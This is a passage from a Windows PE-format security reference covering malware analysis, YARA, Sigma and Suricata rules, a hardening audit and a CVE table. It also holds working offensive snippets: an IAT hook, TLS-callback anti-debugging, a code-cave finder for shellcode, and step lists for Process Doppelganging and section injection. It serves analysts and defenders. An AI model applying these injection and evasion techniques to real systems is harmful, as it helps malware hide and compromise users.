        PIMAGE_THUNK_DATA64 thunk =
            (PIMAGE_THUNK_DATA64)((PBYTE)hmod + imp->FirstThunk);
        PIMAGE_THUNK_DATA64 othunk =
            (PIMAGE_THUNK_DATA64)((PBYTE)hmod + imp->OriginalFirstThunk);
        for (; othunk->u1.AddressOfData; othunk++, thunk++) {
            if (IMAGE_SNAP_BY_ORDINAL64(othunk->u1.Ordinal)) continue;
            PIMAGE_IMPORT_BY_NAME hint =
                (PIMAGE_IMPORT_BY_NAME)((PBYTE)hmod + othunk->u1.AddressOfData);
            if (strcmp(hint->Name, func) != 0) continue;
            DWORD old;
            VirtualProtect(&thunk->u1.Function, sizeof(ULONGLONG),
                           PAGE_READWRITE, &old);
            *original = (PVOID)thunk->u1.Function;
            thunk->u1.Function = (ULONGLONG)detour;
            VirtualProtect(&thunk->u1.Function, sizeof(ULONGLONG),
                           old, &old);
            return;
        }
    }
}
```

Detection: compare in-memory IAT entries against fresh `GetProcAddress` resolution for every imported function. Any mismatch is a hook.

### 20.4 TLS callback anti-debug

A TLS callback that checks `PEB.BeingDebugged` before `EntryPoint` fires:

```c
#include <windows.h>
#include <intrin.h>

void NTAPI tls_antidebug(PVOID dll, DWORD reason, PVOID reserved) {
    if (reason != DLL_PROCESS_ATTACH) return;
    /* Read PEB.BeingDebugged (offset 0x02 from PEB base) */
    PPEB peb = (PPEB)__readgsqword(0x60);
    if (peb->BeingDebugged) {
        /* Corrupt state or exit silently */
        ExitProcess(0);
    }
    /* Additional: NtGlobalFlag at PEB+0x0BC (FLG_HEAP_*) */
    DWORD nt_global = *(DWORD *)((PBYTE)peb + 0x0BC);
    if (nt_global & 0x70) {  /* FLG_HEAP_ENABLE_TAIL_CHECK | FREE_CHECK | VALIDATE */
        ExitProcess(0);
    }
}

#ifdef _MSC_VER
#pragma comment(linker, "/INCLUDE:_tls_used")
#pragma const_seg(".CRT$XLB")
EXTERN_C const PIMAGE_TLS_CALLBACK _tls_cb = tls_antidebug;
#pragma const_seg()
#endif
```

Analyst counter: set breakpoint on `ntdll!LdrpCallTlsInitializers` rather than on `EntryPoint`; patch `PEB.BeingDebugged` to zero before TLS callbacks fire; use ScyllaHide or similar anti-anti-debug plugins.

### 20.5 Process Doppelganging

Process Doppelganging (Black Hat Europe 2017, enSilo) abuses NTFS transactions to create a process from a file that never exists on disk in a committed state:

1. Create an NTFS transaction (`NtCreateTransaction`).
2. Within the transaction, create a file and write the payload (`NtCreateFile` + `NtWriteFile` — transacted).
3. Create a section from the transacted file (`NtCreateSection`).
4. Roll back the transaction (`NtRollbackTransaction`) — the file vanishes from disk.
5. Create a process from the section (`NtCreateProcessEx`).
6. Create initial thread parameters (`RtlCreateProcessParametersEx`) and thread (`NtCreateThreadEx`).

The process appears legitimate (its image section references a file that no longer exists), bypassing most file-based scanning. Detection relies on kernel callbacks (`PsSetCreateProcessNotifyRoutineEx`) observing section-backed process creation where the backing file is absent or was part of a rolled-back transaction. Windows Defender ATP detects this via kernel telemetry; Sysmon EID 25 (process tampering) also covers it on supported builds.

---

## 21. PE Malware Analysis Workflow

### 21.1 Static triage checklist

| Check | Indicator | Notes |
|-------|-----------|-------|
| Section entropy > 7.0 | Likely packed or encrypted | Normal code: 5.5-6.8; normal data: 4.0-7.0 |
| Section entropy < 1.0 on large section | Padding or hollowed section | May contain overlay data post-load |
| EP outside `.text` | Packer, protector, or custom linker | Check section name at EP RVA |
| RWX section | W^X violation | Legitimate only in very old binaries or JIT stubs |
| Suspicious API combo | Injection or evasion | `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread` |
| Rich header absent or zeroed | Intentional stripping | Malware authors strip to hinder attribution |
| Rich header XOR key mismatch | Tampered Rich header | Key should decode cleanly; corruption = editing |
| PDB path present | Build-environment leak | Paths with Cyrillic, Chinese, or temp dirs are indicators |
| PDB path absent on unsigned binary | Stripped for evasion | Most legitimate builds retain PDB reference |
| Import count very low (< 5) | Packed — resolves dynamically | Check for `GetProcAddress` + `LoadLibrary` as the few imports |
| Authenticode absent on system-like binary | Spoofed identity | Combine with `RT_VERSION` claiming Microsoft |
| TLS callbacks present | Anti-debug or pre-EP payload | Rare in legitimate user-mode binaries |

### 21.2 Packer indicators

| Packer | Section names | Entropy pattern | Other signatures |
|--------|---------------|-----------------|------------------|
| UPX | `UPX0` (empty), `UPX1` (packed), `UPX2` | `UPX1` > 7.5; `UPX0` virtual-only | `UPX!` magic at overlay; trivially unpackable with `upx -d` |
| Themida / WinLicense | `.themida`, `.winlice` | All sections > 7.0 | VM-based obfuscation; anti-debug and anti-VM checks; IAT destroyed |
| VMProtect | `.vmp0`, `.vmp1` | Code section > 7.2 | Bytecode VM; virtualizes selected functions; license-check stubs |
| Enigma Protector | `.enigma1`, `.enigma2` | > 7.0 | Anti-dump, anti-debug, virtual box detection, .NET support |
| MPRESS | `.MPRESS1`, `.MPRESS2` | > 7.0 | LZMA-based; similar structure to UPX |
| ASPack | `.aspack`, `.adata` | > 7.0 | Overwrites original EP section; recognizable stub pattern |
| PECompact | `.pec`, `.pec2` | > 7.0 | Plugin-based decompression; multiple codec support |

### 21.3 .NET-specific analysis

**dnSpy / dnSpyEx.** Decompile, debug, and edit .NET assemblies. Reads the metadata tables and IL bytecode; reconstructs C# or VB.NET source. Set breakpoints in decompiled code, inspect locals, step through.

**de4dot.** .NET deobfuscator. Detects and removes obfuscation from ConfuserEx, Dotfuscator, Eazfuscator.NET, SmartAssembly, Babel, Agile, and many others. Recovers method names, string decryption, proxy-call unwinding.

**Metadata inspection checklist:**
- `#US` (user strings) heap — search for URLs, IPs, registry paths, PowerShell snippets.
- `CustomAttribute` table — look for `[DllImport]` (P/Invoke to native APIs), `[Obfuscation]`, `[DebuggerHidden]`.
- `ManifestResource` entries — embedded resources may carry second-stage payloads, encrypted configs, or additional assemblies.
- `TypeRef` / `MemberRef` — external references reveal runtime dependencies (e.g., `System.Reflection.Assembly.Load` for reflective loading).
- Module MVID (Module Version ID GUID) — pivot for variant tracking across obfuscated samples.

---

## 22. YARA Rules for PE Anomalies

```yara
import "pe"
import "math"

rule ep_outside_text {
    meta:
        description = "Entry point falls outside .text section"
        severity    = "MEDIUM"
    condition:
        uint16(0) == 0x5A4D and
        for all i in (0..pe.number_of_sections - 1) : (
            pe.sections[i].name != ".text" or
            not (pe.entry_point >= pe.sections[i].raw_data_offset and
                 pe.entry_point < pe.sections[i].raw_data_offset +
                                   pe.sections[i].raw_data_size)
        )
}

rule high_entropy_code_section {
    meta:
        description = "Code section with entropy > 7.0 — likely packed"
        severity    = "HIGH"
    condition:
        uint16(0) == 0x5A4D and
        for any i in (0..pe.number_of_sections - 1) : (
            (pe.sections[i].characteristics & 0x20000000) != 0 and
            math.entropy(pe.sections[i].raw_data_offset,
                         pe.sections[i].raw_data_size) > 7.0
        )
}

rule tls_callbacks_present {
    meta:
        description = "PE has TLS callbacks — pre-EP execution"
        severity    = "MEDIUM"
    condition:
        uint16(0) == 0x5A4D and
        pe.data_directories[pe.IMAGE_DIRECTORY_ENTRY_TLS].virtual_address != 0 and
        pe.data_directories[pe.IMAGE_DIRECTORY_ENTRY_TLS].size > 0
}

rule injection_api_imports {
    meta:
        description = "Imports classic injection API triple"
        severity    = "HIGH"
    condition:
        uint16(0) == 0x5A4D and
        pe.imports("kernel32.dll", "VirtualAllocEx") and
        pe.imports("kernel32.dll", "WriteProcessMemory") and
        pe.imports("kernel32.dll", "CreateRemoteThread")
}

rule rwx_section {
    meta:
        description = "Section with Read+Write+Execute — W^X violation"
        severity    = "HIGH"
    condition:
        uint16(0) == 0x5A4D and
        for any i in (0..pe.number_of_sections - 1) : (
            (pe.sections[i].characteristics & 0xE0000000) == 0xE0000000
        )
}

rule rich_header_missing_or_zeroed {
    meta:
        description = "Rich header absent or zeroed — provenance stripped"
        severity    = "LOW"
    condition:
        uint16(0) == 0x5A4D and
        (not defined pe.rich_signature.offset or
         pe.rich_signature.length == 0)
}
```

Notes on deployment: the `pe` and `math` modules must be compiled into YARA (`--enable-pe --enable-math` at build time or present in the distribution). The `ep_outside_text` rule fires legitimately on Go binaries (EP in `.text` named differently) and Delphi (EP in `CODE` section) — whitelist known compilers. The injection-API rule is high-signal but not high-specificity; combine with entropy or packer indicators for a composite score.

---

## 23. PE Hardening Audit

### 23.1 Automated mitigation checker

```python
#!/usr/bin/env python3
"""Check PE mitigation flags: ASLR, DEP, CFG, /GS, SEHOP, Authenticode, CET."""
import pefile, sys

CHECKS = []

def check(name):
    def decorator(fn):
        CHECKS.append((name, fn))
        return fn
    return decorator

@check("ASLR (DYNAMIC_BASE)")
def _aslr(pe):
    return bool(pe.OPTIONAL_HEADER.DllCharacteristics & 0x0040)

@check("High-Entropy VA")
def _hieva(pe):
    return bool(pe.OPTIONAL_HEADER.DllCharacteristics & 0x0020)

@check("DEP (NX_COMPAT)")
def _dep(pe):
    return bool(pe.OPTIONAL_HEADER.DllCharacteristics & 0x0100)

@check("CFG (GUARD_CF)")
def _cfg(pe):
    return bool(pe.OPTIONAL_HEADER.DllCharacteristics & 0x4000)

@check("/GS Stack Cookie")
def _gs(pe):
    if not hasattr(pe, "DIRECTORY_ENTRY_LOAD_CONFIG"):
        return False
    lc = pe.DIRECTORY_ENTRY_LOAD_CONFIG.struct
    return hasattr(lc, "SecurityCookie") and lc.SecurityCookie != 0

@check("SafeSEH (x86 only)")
def _safeseh(pe):
    if pe.OPTIONAL_HEADER.Magic != 0x10B:  # PE32 only
        return "N/A (x64)"
    if not hasattr(pe, "DIRECTORY_ENTRY_LOAD_CONFIG"):
        return False
    lc = pe.DIRECTORY_ENTRY_LOAD_CONFIG.struct
    return hasattr(lc, "SEHandlerCount") and lc.SEHandlerCount > 0

@check("SEHOP (NO_SEH declared)")
def _sehop(pe):
    return bool(pe.OPTIONAL_HEADER.DllCharacteristics & 0x0400)

@check("Force Integrity (signed load)")
def _integrity(pe):
    return bool(pe.OPTIONAL_HEADER.DllCharacteristics & 0x0080)

@check("Authenticode Present")
def _authenticode(pe):
    cert = pe.OPTIONAL_HEADER.DATA_DIRECTORY[4]
    return cert.VirtualAddress != 0 and cert.Size > 0

@check("CET Shadow Stack Compatible")
def _cet(pe):
    # CET compat is in IMAGE_DEBUG_TYPE_EX_DLLCHARACTERISTICS (type 20)
    if not hasattr(pe, "DIRECTORY_ENTRY_DEBUG"):
        return False
    for dbg in pe.DIRECTORY_ENTRY_DEBUG:
        if dbg.struct.Type == 20:  # IMAGE_DEBUG_TYPE_EX_DLLCHARACTERISTICS
            return True
    return False

@check("Relocations Present (.reloc)")
def _reloc(pe):
    reloc_dir = pe.OPTIONAL_HEADER.DATA_DIRECTORY[5]
    stripped = bool(pe.FILE_HEADER.Characteristics & 0x0001)
    return reloc_dir.Size > 0 and not stripped

def audit(path):
    pe = pefile.PE(path)
    print(f"Hardening audit: {path}\n")
    all_pass = True
    for name, fn in CHECKS:
        result = fn(pe)
        status = "PASS" if result is True else ("N/A" if isinstance(result, str) else "FAIL")
        indicator = "[+]" if result is True else ("[~]" if isinstance(result, str) else "[-]")
        print(f"  {indicator} {name:<35} {status}")
        if result is False:
            all_pass = False
    print(f"\nOverall: {'ALL PASS' if all_pass else 'DEFICIENCIES FOUND'}")
    pe.close()

if __name__ == "__main__":
    audit(sys.argv[1])
```

### 23.2 Mitigation status matrix

| Mitigation | PE Field / Location | Pass Condition |
|------------|-------------------|----------------|
| ASLR | `DllCharacteristics` bit 0x0040 | Set, AND `.reloc` directory populated |
| High-Entropy ASLR | `DllCharacteristics` bit 0x0020 | Set (64-bit only; meaningless on PE32) |
| DEP / NX | `DllCharacteristics` bit 0x0100 | Set |
| CFG | `DllCharacteristics` bit 0x4000 | Set, AND `GuardCFFunctionTable` populated in load config |
| XFG | Load config `GuardFlags` `IMAGE_GUARD_XFG_ENABLED` | Flag set and XFG check function pointer non-zero |
| /GS Stack Cookie | Load config `SecurityCookie` | Non-zero VA |
| SafeSEH | Load config `SEHandlerTable` / `SEHandlerCount` | x86 only; count > 0 |
| SEHOP | `DllCharacteristics` bit 0x0400 (NO_SEH) | Set if binary has no SEH; OS-level SEHOP is separate |
| CET Shadow Stack | Debug directory type 20 `EX_DLLCHARACTERISTICS` bit 0x01 | Present |
| CET IBT (Indirect Branch Tracking) | Debug directory type 20 bit 0x02 | Present |
| Authenticode | Data directory 4 (Certificate Table) | Non-zero offset and size; valid chain via `WinVerifyTrust` |
| Force Integrity | `DllCharacteristics` bit 0x0080 | Set (drivers and protected processes) |
| AppContainer | `DllCharacteristics` bit 0x1000 | Set when binary runs sandboxed |
| Relocations present | Data directory 5 + `IMAGE_FILE_RELOCS_STRIPPED` | `.reloc` size > 0, stripped flag clear |

---

## 24. Detection Rules

### 24.1 Sigma rules

**Process hollowing (Sysmon EID 1 + EID 10):**

```yaml
title: Process Hollowing - Suspicious Process Access After Suspended Create
id: d8f1c5a2-7e3b-4f9a-b1c6-2e4d8f9a3b5c
status: experimental
date: 2025-03-15
logsource:
    category: process_access
    product: windows
detection:
    selection_access:
        EventID: 10
        GrantedAccess|contains:
            - '0x1FFFFF'     # PROCESS_ALL_ACCESS
            - '0x1F0FFF'     # PROCESS_ALL_ACCESS (alternate)
        CallTrace|contains:
            - 'ntdll.dll'
    selection_create:
        EventID: 1
        CommandLine|endswith:
            - ' --suspended'
    filter_legitimate:
        SourceImage|endswith:
            - '\WerFault.exe'
            - '\MsMpEng.exe'
            - '\svchost.exe'
    condition: selection_access and not filter_legitimate
level: high
tags:
    - attack.defense_evasion
    - attack.t1055.012
```

**Reflective DLL loading (Sysmon EID 7 — image load without file):**

```yaml
title: Reflective DLL Loading - Image Loaded Without Backing File
id: a3b7c9d1-4e5f-6a8b-9c0d-1e2f3a4b5c6d
status: experimental
date: 2025-03-15
logsource:
    category: image_load
    product: windows
detection:
    selection:
        EventID: 7
        ImageLoaded: ''
    filter_dotnet:
        ImageLoaded|contains:
            - '\Assembly\NativeImages'
            - '\clrjit.dll'
    condition: selection and not filter_dotnet
level: high
tags:
    - attack.defense_evasion
    - attack.t1620
```

**PE execution from temp or user-writable paths:**

```yaml
title: PE Execution From Suspicious Path
id: f1e2d3c4-b5a6-7890-abcd-ef1234567890
status: experimental
date: 2025-03-15
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        EventID: 1
        Image|contains:
            - '\Temp\'
            - '\AppData\Local\Temp\'
            - '\AppData\Roaming\'
            - '\Downloads\'
            - '\ProgramData\'
            - '\Users\Public\'
    filter_known:
        Image|endswith:
            - '\setup.exe'
            - '\installer.exe'
            - '\update.exe'
        Hashes|contains: 'IMPHASH='
    condition: selection and not filter_known
level: medium
tags:
    - attack.execution
    - attack.t1204.002
```

### 24.2 Suricata rules

```
# MZ header detected in HTTP response body
alert http any any -> $HOME_NET any (msg:"ET POLICY PE EXE Download via HTTP"; \
    flow:established,to_client; \
    file_data; content:"MZ"; offset:0; depth:2; \
    content:"PE|00 00|"; distance:0; within:1024; \
    classtype:policy-violation; sid:2028000; rev:1;)

# PE download with renamed extension (masquerading)
alert http any any -> $HOME_NET any (msg:"ET MALWARE PE Download Renamed Extension"; \
    flow:established,to_client; \
    file_data; content:"MZ"; offset:0; depth:2; \
    content:"PE|00 00|"; distance:0; within:1024; \
    content:!"Content-Type|3a| application/x-msdos-program"; \
    content:!"Content-Type|3a| application/x-msdownload"; \
    content:!"Content-Type|3a| application/octet-stream"; \
    classtype:trojan-activity; sid:2028001; rev:1;)
```

### 24.3 Volatility 3 plugins

| Plugin | Purpose |
|--------|---------|
| `windows.malfind` | Scan process memory for regions with `PAGE_EXECUTE_READWRITE` containing PE headers or shellcode indicators |
| `windows.hollowfind` | Detect hollowed processes by comparing the in-memory image against the on-disk backing file |
| `windows.vadinfo` | Dump VAD (Virtual Address Descriptor) tree per process — shows all mapped regions, protection, and backing file |
| `windows.dlllist` | List loaded DLLs from the PEB `InLoadOrderModuleList` — compare against `windows.modules` (kernel view) for discrepancies |
| `windows.handles` | Enumerate handles — look for open handles to `\Device\PhysicalMemory`, `\KnownDlls`, or sections with `SECTION_MAP_EXECUTE` |

### 24.4 PE-sieve live scanning

PE-sieve (hasherezade) scans a running process for in-memory anomalies:

```
pe-sieve64.exe /pid <PID> /shellc /iat 3 /ofilter 2 /dmode 1
```

Checks: hollowed modules (on-disk vs in-memory mismatch), implanted code (non-module executable regions), IAT hooks, inline hooks (function-entry patching), and shellcode patterns. Outputs JSON report plus dumped artifacts. Integrates with HollowsHunter for system-wide sweeps across all processes.

---

## 25. CVE Reference Table

| CVE | Year | Component | CWE | Description |
|-----|------|-----------|-----|-------------|
| MS13-098 / CVE-2013-3900 | 2013 | WinVerifyTrust | CWE-347 | Authenticode signature validation allows appending data after the certificate table without invalidating the signature. Attackers embed payloads in the trailing space. Microsoft issued a registry-based opt-in fix (`EnableCertPaddingCheck`); made default-on in later builds. |
| CVE-2020-1599 | 2020 | Authenticode | CWE-347 | Spoofed PE signature validation bypass. A PE file with appended overlay data retains a valid Authenticode signature despite content modification, because the hash calculation excludes post-certificate bytes. |
| CVE-2021-43217 | 2021 | Windows EFS / NTFS | CWE-269 | PE loader behavior interaction with EFS-encrypted files enables local privilege escalation via crafted PE placement. |
| CVE-2020-0601 (CurveBall) | 2020 | CryptoAPI (crypt32.dll) | CWE-295 | Windows CryptoAPI fails to properly validate ECC certificate chains. Attackers forge Authenticode code-signing certificates that chain to a trusted root by specifying custom curve parameters. Affects all Authenticode-dependent trust decisions. |
| CVE-2021-1732 | 2021 | Win32k / PE loader | CWE-269 | Type-confusion in win32k triggered during callback processing; exploited in the wild for local EOP. PE-format relevance: payload delivered as a PE with specific section layout to control memory state. |
| CVE-2023-36025 | 2023 | SmartScreen / Mark-of-the-Web | CWE-693 | SmartScreen bypass via crafted URL files that reference PE downloads. The PE itself is well-formed but the delivery mechanism evades the MotW check that would trigger SmartScreen prompts. |
| CVE-2024-21412 | 2024 | SmartScreen / Internet Shortcut | CWE-693 | Internet Shortcut (.url) files bypass Mark-of-the-Web propagation, allowing unsigned PEs to execute without SmartScreen warning. Exploited by DarkGate and Water Hydra threat actors. |
| CVE-2018-8120 | 2018 | Win32k | CWE-416 | NULL pointer dereference in `NtUserSetImeInfoEx` enabling kernel EOP. Exploitation payload typically injected via PE process hollowing into a legitimate process. |
| CVE-2020-0796 (SMBGhost) | 2020 | SMBv3 compression | CWE-120 | Integer overflow in SMBv3 compression leads to RCE. Post-exploitation commonly delivers PE payloads via reflective injection into `svchost.exe`. |
| CVE-2017-11882 | 2017 | Equation Editor (EQNEDT32.EXE) | CWE-121 | Stack buffer overflow in the OLE Equation Editor component (a PE binary). Crafted OLE object triggers code execution. The vulnerable PE had no ASLR, no DEP, no CFG — compiled in 2000 and never updated. |
| CVE-2019-0841 | 2019 | Windows AppX Deployment (DISM) | CWE-59 | NTFS junction + hardlink abuse in AppX package deployment leads to arbitrary ACL rewrite. Attacker crafts a PE package that exploits the deployment service's file-handling to escalate privileges. |
| CVE-2021-40444 | 2021 | MSHTML / ActiveX | CWE-94 | Remote code execution via crafted ActiveX control embedded in Office documents. The control downloads and executes a PE payload. The CAB extraction stage abuses the PE certificate table area to embed the payload within a signed-looking container. |

---

## 26. PE Exploitation Techniques

This section deepens the mechanisms introduced in §20 and covers exploitation chains, evasion variants, and PE-format abuse patterns not previously addressed.

### 26.1 DLL search order hijacking

When a PE calls `LoadLibrary("target.dll")` without a fully qualified path, the Windows loader searches directories in a deterministic order. The default search order for desktop applications (SafeDllSearchMode enabled, the default since Windows XP SP2):

1. The directory from which the application loaded (the application directory).
2. The system directory (`C:\Windows\System32`).
3. The 16-bit system directory (`C:\Windows\System`).
4. The Windows directory (`C:\Windows`).
5. The current working directory (CWD).
6. Directories listed in the `PATH` environment variable.

An attacker who can place a malicious DLL earlier in this order — typically in the application directory (step 1) or the CWD (step 5) — hijacks the load. The technique is devastating because it requires no memory corruption, no exploit primitive, and no special privilege beyond write access to the target directory.

**Phantom DLL loading.** Some executables import DLLs that do not exist on the target system. The loader walks the full search order, fails, and the application may continue (delay-load, `LoadLibrary` with error handling) or crash. An attacker who drops a DLL with that exact name into a directory that precedes the failure point wins code execution. Discovery: run Process Monitor with filters `Path contains .dll` and `Result is NAME NOT FOUND` while exercising the target application. Every "phantom" DLL is a hijack candidate.

```powershell
# Procmon CLI filter to find phantom DLLs for a target process
# Requires Sysinternals Process Monitor (procmon64.exe)
procmon64.exe /AcceptEula /Quiet /Minimized /BackingFile phantom.pml
# Exercise the target application, then stop recording
procmon64.exe /Terminate

# Convert to CSV and filter
procmon64.exe /OpenLog phantom.pml /SaveAs phantom.csv
# Parse for phantom DLLs
Get-Content phantom.csv |
  Select-String -Pattern '"NAME NOT FOUND"' |
  Select-String -Pattern '\.dll"' |
  ForEach-Object {
    if ($_ -match '"([^"]+\.dll)"') { $matches[1] }
  } | Sort-Object -Unique
```

**KnownDLLs bypass.** The `KnownDLLs` registry key (`HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`) lists DLLs that the loader maps from the System32 directory exclusively, preventing application-directory hijacking for those names. The list is incomplete — it covers about 40 DLLs (kernel32, ntdll, user32, advapi32, etc.) but not all system DLLs. DLLs absent from `KnownDLLs` that are commonly imported (such as `version.dll`, `userenv.dll`, `dbghelp.dll`, `winhttp.dll`, `dwrite.dll`) remain hijackable.

```python
#!/usr/bin/env python3
"""Enumerate DLLs imported by a PE that are NOT in the KnownDLLs list."""
import pefile
import winreg
import sys

def get_known_dlls():
    known = set()
    try:
        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs"
        )
        i = 0
        while True:
            try:
                _, value, _ = winreg.EnumValue(key, i)
                known.add(value.lower())
                i += 1
            except OSError:
                break
        winreg.CloseKey(key)
    except OSError:
        pass
    return known

def check_hijackable(pe_path):
    known = get_known_dlls()
    pe = pefile.PE(pe_path)
    if not hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
        print("No imports found.")
        pe.close()
        return

    hijackable = []
    for entry in pe.DIRECTORY_ENTRY_IMPORT:
        dll_name = entry.dll.decode('utf-8', errors='replace').lower()
        if dll_name not in known:
            hijackable.append(dll_name)

    print(f"Imports not in KnownDLLs ({len(hijackable)}):")
    for dll in sorted(hijackable):
        print(f"  [!] {dll}")
    pe.close()

if __name__ == "__main__":
    check_hijackable(sys.argv[1])
```

**DLL side-loading.** A variant used extensively by APT groups (APT41, Lazarus, Mustang Panda): the attacker distributes a legitimate signed executable alongside a malicious DLL that the executable loads. Because the executable is signed and trusted, the malicious DLL executes with the same trust context. The attacker does not modify the executable — they exploit its existing import table. Common side-loading targets: `version.dll`, `msvcp140.dll`, `vcruntime140.dll`, `winmm.dll`.

Detection:
- File hash of the EXE matches known-good, but the DLL hash in the same directory does not match any known build of that DLL.
- Sigma rule: `ParentImage` is a signed binary, but `ImageLoaded` has no valid signature and resides in the same directory.
- Sysmon EID 7 (Image loaded) where `ImageLoaded` path is not `System32` for a system DLL name.

### 26.2 PE section injection and code caves

**Adding a new section.** An attacker modifies the PE to append a new section header and body:

1. Increase `NumberOfSections` in the COFF file header.
2. Append a new `IMAGE_SECTION_HEADER` entry after the last existing entry (space permitting — there must be room between the end of the section table and `SizeOfHeaders`).
3. Set the new section's `VirtualAddress` to align past the last section's `VirtualAddress + VirtualSize` (respecting `SectionAlignment`).
4. Set `PointerToRawData` to point past the last section's raw data.
5. Set `Characteristics` to `IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_CODE` (0x60000020).
6. Append payload bytes at the file offset.
7. Update `SizeOfImage` in the optional header.
8. Optionally redirect `AddressOfEntryPoint` to the new section or patch a JMP from the original entry point.

```python
#!/usr/bin/env python3
"""Detect injected PE sections: anomalous names, W+X, non-standard characteristics."""
import pefile
import math
import sys

NORMAL_NAMES = {
    '.text', '.rdata', '.data', '.rsrc', '.reloc', '.pdata',
    '.edata', '.idata', '.CRT', '.tls', '.bss', '.didat',
    '.debug', '.xdata', '.cfg', '.gfids', '.giats', '.00cfg',
    '.retplne', '.voltbl',
}

# Packer / injected section names (non-exhaustive)
SUSPICIOUS_NAMES = {
    'UPX0', 'UPX1', 'UPX2', '.vmp0', '.vmp1', '.themida',
    '.winlice', '.enigma1', '.enigma2', '.MPRESS1', '.MPRESS2',
    '.aspack', '.adata', '.pec', '.pec2', '.text0', '.code',
    '.stub', '.packed', '.loader',
}

def section_entropy(pe, section):
    data = pe.get_data(section.PointerToRawData, section.SizeOfRawData)
    if len(data) == 0:
        return 0.0
    freq = [0] * 256
    for b in data:
        freq[b] += 1
    length = len(data)
    return -sum(
        (f / length) * math.log2(f / length)
        for f in freq if f > 0
    )

def analyze_sections(path):
    pe = pefile.PE(path)
    print(f"Section analysis: {path}")
    print(f"{'Name':<12} {'VA':>10} {'VSize':>10} {'RawOff':>10} "
          f"{'RawSz':>10} {'Chars':>10} {'Entropy':>8} {'Flags'}")
    print("-" * 95)

    for sec in pe.sections:
        name = sec.Name.decode('utf-8', errors='replace').rstrip('\x00')
        ent = section_entropy(pe, sec)
        flags = []

        # Write + Execute = W^X violation
        wx = (sec.Characteristics & 0x80000000) and \
             (sec.Characteristics & 0x20000000)
        if wx:
            flags.append("W+X")

        # Suspicious name
        if name in SUSPICIOUS_NAMES:
            flags.append("SUS_NAME")
        elif name not in NORMAL_NAMES and not name.startswith('.'):
            flags.append("UNUSUAL_NAME")

        # High entropy
        if ent > 7.0 and sec.SizeOfRawData > 512:
            flags.append("HIGH_ENT")

        # VirtualSize >> RawDataSize (possible unpacking stub)
        if sec.Misc_VirtualSize > sec.SizeOfRawData * 10 and \
           sec.Misc_VirtualSize > 0x10000:
            flags.append("INFLATED_VS")

        # Zero raw data but non-zero virtual (writable BSS-like, or unpack target)
        if sec.SizeOfRawData == 0 and sec.Misc_VirtualSize > 0x1000:
            flags.append("EMPTY_RAW")

        flag_str = ", ".join(flags) if flags else "OK"
        print(f"{name:<12} {sec.VirtualAddress:>#10x} "
              f"{sec.Misc_VirtualSize:>#10x} "
              f"{sec.PointerToRawData:>#10x} "
              f"{sec.SizeOfRawData:>#10x} "
              f"{sec.Characteristics:>#10x} "
              f"{ent:>8.2f} {flag_str}")

    pe.close()

if __name__ == "__main__":
    analyze_sections(sys.argv[1])
```

**Code caves.** Rather than adding a section, an attacker writes shellcode into unused padding within existing sections. Most PE sections are padded to `FileAlignment` (typically 0x200), leaving slack space between the end of actual content and the next alignment boundary. A code cave finder:

```python
#!/usr/bin/env python3
"""Find code caves (NUL runs) in PE sections suitable for shellcode injection."""
import pefile
import sys

MIN_CAVE_SIZE = 64  # Minimum usable cave in bytes

def find_caves(path):
    pe = pefile.PE(path)
    for sec in pe.sections:
        data = pe.get_data(sec.PointerToRawData, sec.SizeOfRawData)
        name = sec.Name.decode('utf-8', errors='replace').rstrip('\x00')
        cave_start = None
        cave_len = 0
        for i, b in enumerate(data):
            if b == 0x00:
                if cave_start is None:
                    cave_start = i
                cave_len += 1
            else:
                if cave_len >= MIN_CAVE_SIZE:
                    file_off = sec.PointerToRawData + cave_start
                    rva = sec.VirtualAddress + cave_start
                    print(f"  [{name}] Cave at file offset 0x{file_off:08x} "
                          f"(RVA 0x{rva:08x}), {cave_len} bytes")
                cave_start = None
                cave_len = 0
        # Trailing cave
        if cave_len >= MIN_CAVE_SIZE:
            file_off = sec.PointerToRawData + cave_start
            rva = sec.VirtualAddress + cave_start
            print(f"  [{name}] Cave at file offset 0x{file_off:08x} "
                  f"(RVA 0x{rva:08x}), {cave_len} bytes")
    pe.close()

if __name__ == "__main__":
    find_caves(sys.argv[1])
```

Detection: compare the file's `NumberOfSections` and `SizeOfImage` against known-good baselines. Sections with executable permissions that contain NOP sleds, JMP trampolines, or shellcode patterns within alignment padding are indicators.

### 26.3 Advanced reflective injection variants

§20.2 covers the classic Stephen Fewer technique. Modern variants evade detection more effectively:

**Module stomping (DLL hollowing).** Instead of allocating a new RWX region (which is trivially flagged by `VirtualAlloc` auditing and memory scanners), the attacker loads a legitimate DLL via `LoadLibrary`, then overwrites its `.text` section with payload code. The memory region retains its original backing file association in the VAD tree, passing `windows.malfind` checks that compare region flags against expected module mappings. Detection requires byte-level comparison of in-memory module content against the on-disk file — exactly what PE-sieve's `pesieve64.exe /pid <PID> /shellc /iat 3` performs.

**Transacted hollowing (variant of Process Doppelganging, §20.5).** Instead of creating a process, the attacker creates a section from a transacted file, maps it into an existing process, and jumps to it. The section appears backed by a file that no longer exists.

**Manual mapping without VirtualAllocEx.** Advanced implants use `NtMapViewOfSection` to map a section object into the target, avoiding the `VirtualAllocEx` + `WriteProcessMemory` telemetry chain. The section is created from a file or anonymous memory, and the mapping inherits the section's page protection.

**Ghostly hollowing (2021).** Creates a delete-pending file (opened with `FILE_FLAG_DELETE_ON_CLOSE`), writes the payload, creates a section from it, then closes the handle (file vanishes). The section remains valid because the kernel holds a reference. Process creation from this section produces a process with no backing file. Detected by checking `FILE_OBJECT->DeletePending` state during process-creation callbacks.

### 26.4 PE resource abuse

The `.rsrc` section stores typed resources: icons, dialogs, version info, manifests, and crucially `RT_RCDATA` (raw data blobs) that can contain anything. Attackers embed encrypted payloads, configuration blocks, or entire second-stage PEs as resources.

**Embedding payloads in resources:**

```c
/* Attacker-side: extract embedded payload from resources at runtime */
#include <windows.h>

BOOL extract_payload(HMODULE hModule, DWORD resource_id,
                     LPVOID *out_buf, DWORD *out_size) {
    HRSRC hRes = FindResourceW(hModule,
                               MAKEINTRESOURCEW(resource_id),
                               RT_RCDATA);
    if (!hRes) return FALSE;

    HGLOBAL hGlob = LoadResource(hModule, hRes);
    if (!hGlob) return FALSE;

